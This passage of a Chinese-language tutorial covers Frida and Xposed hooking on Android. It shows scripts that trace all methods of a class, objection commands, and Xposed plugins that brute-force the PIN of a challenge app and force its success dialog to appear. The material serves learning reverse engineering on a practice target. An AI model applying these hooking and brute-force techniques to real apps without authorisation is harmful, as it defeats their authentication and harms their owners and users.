/></p><p>&emsp;之后，对上述寻找到的目标类中所有的函数进行hook，即实现上述代码中注释掉的traceClass函数，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params">targetClassMethod</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">    <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line"><span class="comment">// hook 类中的所有函数的所有重载</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">        hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">            <span class="comment">// print args</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// print retval</span></span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nretval: &quot;</span> + retval)</span><br><span class="line">            <span class="keyword">return</span> retval</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uniqBy</span>(<span class="params">array, key</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> seen = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> array.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="title function_">key</span>(item);</span><br><span class="line">        <span class="keyword">return</span> seen.<span class="title function_">hasOwnProperty</span>(k) ? <span class="literal">false</span> : (seen[k] = <span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceClass</span>(<span class="params">targetClass</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 Java.use 新建对象</span></span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">    <span class="comment">// 利用反射的方式，拿到当前类的所有方法</span></span><br><span class="line">    <span class="keyword">var</span> methods = hook.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">    <span class="comment">// 将对象释放掉</span></span><br><span class="line">    hook.<span class="property">$dispose</span></span><br><span class="line">    <span class="comment">// 将方法名保存到数组中</span></span><br><span class="line">    <span class="keyword">var</span> parsedMethods = []</span><br><span class="line">    methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">        <span class="comment">// method_name</span></span><br><span class="line">        parsedMethods.<span class="title function_">push</span>(method.<span class="title function_">toString</span>().<span class="title function_">replace</span>(targetClass + <span class="string">&quot;.&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>).<span class="title function_">match</span>(<span class="regexp">/\sTOKEN(.*)\(/</span>)[<span class="number">1</span>])</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 去掉重复值</span></span><br><span class="line">    <span class="keyword">var</span> targets = <span class="title function_">uniqBy</span>(parsedMethods, <span class="title class_">JSON</span>.<span class="property">stringify</span>)</span><br><span class="line">    <span class="comment">// 对数组中所有的方法进行 hook</span></span><br><span class="line">    targets.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">targetMethod</span>) &#123;</span><br><span class="line">        <span class="title function_">traceMethod</span>(targetClass + <span class="string">&quot;.&quot;</span> + targetMethod)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;上述代码中，traceClass函数必须先获得要钩取类的类名才行。那么，<code>如果我不知道类名，还要hook所有的beforeHookedMethod与afterHookedMethod，该用啥骚姿势？</code></p><p>&emsp;已经知道，afterHookedMethod/beforeHookedMethod是使用XC_MethodHook的抽象类实现的，前面插件中的HookTest$1，是匿名内部类，也是XC_MethodHook的子类，它有afterHookedMethod/beforeHookedMethod函数。<code>我们只需要关心XC_MethodHook即可。</code>相关脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getAllXCMethodHook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAllXCMethodHook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(superClass + <span class="string">&quot; | &quot;</span> + className)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;    </span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;注入到<code>com.android.systemui</code>中，上述脚本与hook.js好类似（一模一样），结果输出如下（输出了所有父类为XC_MethodHook的子类）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021223136596.png" alt="image-20231021223136596" style="zoom:67%;" /></p><p>&emsp;结合上述描述，<code>Xposed的原理是：通过新建专门用于实现hook的PathClassLoader，并注入目标进程，从而完成对目标函数的插桩。PathClassLoader加载的类列表中包含对目标进程Hook的逻辑，而原生的Xposed API则处于指向XposedBridge.jar文件的ClassLoader。</code></p><h3 id="Xposed-主动调用与-RPC-实现"><a href="#Xposed-主动调用与-RPC-实现" class="headerlink" title="Xposed 主动调用与 RPC 实现"></a>Xposed 主动调用与 RPC 实现</h3><h4 id="Xposed-主动调用函数"><a href="#Xposed-主动调用函数" class="headerlink" title="Xposed 主动调用函数"></a>Xposed 主动调用函数</h4><p>&emsp;以example.apk为例，目的是获取pin值，我们要获得正确的pin。app标识符为<code>org.teamsik.ahe17.qualification.easy</code>。</p><p>（1）使用 objection 分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g org.teamsik.ahe17.qualification.easy explore</span><br><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p>&emsp;发现<code>org.teamsik.ahe17.qualification.MainActivity</code>类（仅有这一个），之后钩取MainActivity的所有函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class org.teamsik.ahe17.qualification.MainActivity</span><br></pre></td></tr></table></figure><p>&emsp;之后点击<code>VERIFY PIN</code>，定位到验证函数：<code>org.teamsik.ahe17.qualification.MainActivity.verifyPasswordClick</code>。</p><p>（2）jeb找到verifyPasswordClick，源码如下，静态分析可以发现，PIN码长度为4，使用SHA1进行加密，并与指定密文对比：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021232633646.png" alt="image-20231021232633646" style="zoom:67%;" /></p><p>&emsp;思路：<code>使用Xposed主动调用，暴力穷举，并与密文对比。</code>Xposed关于主动调用的API为<code>callMethod（用于调用对象实例所的动态静态函数）/callStaticMethod（调用类的静态函数）</code>。其函数签名各自为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callMethod(Object obj, String methodName, Object... args)</span><br><span class="line">// &quot;Class&lt;?&gt; clazz&quot; 代表 clazz 是类就行</span><br><span class="line">callStaticMethod(Class&lt;?&gt; clazz, String methodName, Object... args)</span><br></pre></td></tr></table></figure><p>&emsp;使用Xposed要主动调用encodePassword，使用callStaticMethod函数。相关代码如下（Xposed插件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 静态调用 encodePassword</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 获取 verifier 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">// 正确答案</span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// 静态调用 encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])XposedHelpers.callStaticMethod(clazz, <span class="string">&quot;encodePassword&quot;</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// 作比较</span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;安装好后，之后打开example.apk，再打开日志，发现9083为正确的pin。<code>其实，java本身就存在主动调用函数的方式，即invoke反射，Xposed的主动调用函数本质上也是调用Invoke函数。</code>因此，可以更改代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 反射获取 verifier 类与 Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">encodePassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;encodePassword&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 允许函数通过外部反射调用，这里主要针对目标函数是 private 私有函数</span></span><br><span class="line">        encodePassword.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 正确答案</span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// 静态调用 encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])encodePassword.invoke(<span class="literal">null</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// 作比较</span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;与frida主动调用类似，xposed主动调用面对的问题有：<code>参数构造；针对动态函数如何获取对象实例</code>。</p><p>&emsp;针对参数构造问题，要么就hook相同类型的数据（略），要么就自己构造参数。由于xposed是原生java而言的，因此，xposed相比frida在参数构造上有优势。例如，若想构造<code>verifyPassword(Context,String)</code>的Context参数，frida代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ActivityThread</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Context</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.content.Context&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = <span class="title class_">Java</span>.<span class="keyword">case</span>(<span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>(), <span class="title class_">Context</span>)</span><br></pre></td></tr></table></figure><p>&emsp;而xposed代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br></pre></td></tr></table></figure><p>&emsp;相应的，xposed完整的主动调用verifyPassword函数的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">// 反射获取 verifier 类与 Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">verifyPassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;verifyPassword&quot;</span>, Context.class, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// invoke 主动调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)verifyPassword.invoke(<span class="literal">null</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;上面是xposed构造复杂参数。在主动构造实例对象时，可以使用java Constructor类的newInstance进行构造，也可以使用封装过的XposedHelpers.newInstance()进行构造，相应代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java Constructor类的newInstance</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 Verifier 对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> XposedHelpers.findConstructorExact(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> cons.newInstance();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier 对象调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XposedHelpers.newInstance()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 Verifier 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Verifier</span> <span class="operator">=</span> XposedHelpers.newInstance(clazz);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// Verifier 对象调用 verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)XposedHelpers.callMethod(Verifier, <span class="string">&quot;verifyPassword&quot;</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>上文并未介绍xposed hook拿到实例对象的方法，这是因为verifier类中函数全为static的，因此verifier类并未初始化，也就hook不到了。</code>那咋办？换一个类然后再介绍hook拿实例对象呗。以MainActivity中的showSuccessDialog为例（不是静态函数），<code>首先hook MainActivity的onCreate方法，创建MainActivity对象，在hook的afterHookMethod中，主动调用showSuccessDialog函数。</code>代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 获取 MainActivity 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.MainActivity&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// hook onCreate</span></span><br><span class="line">        XposedBridge.hookAllMethods(clazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                <span class="comment">// 获取 MainActivity 对象</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">mMainActivity</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line">                <span class="comment">// 主动调用 showSuccessDialog 函数</span></span><br><span class="line">                XposedHelpers.callMethod(mMainActivity, <span class="string">&quot;showSuccessDialog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;这样的话，打开example.apk就显示congratulation的成功提示。</p><h4 id="Xposed-结合-NanoHTTPD-实现-RPC-调用"><a href="#Xposed-结合-NanoHTTPD-实现-RPC-调用" class="headerlink" title="Xposed 结合 NanoHTTPD 实现 RPC 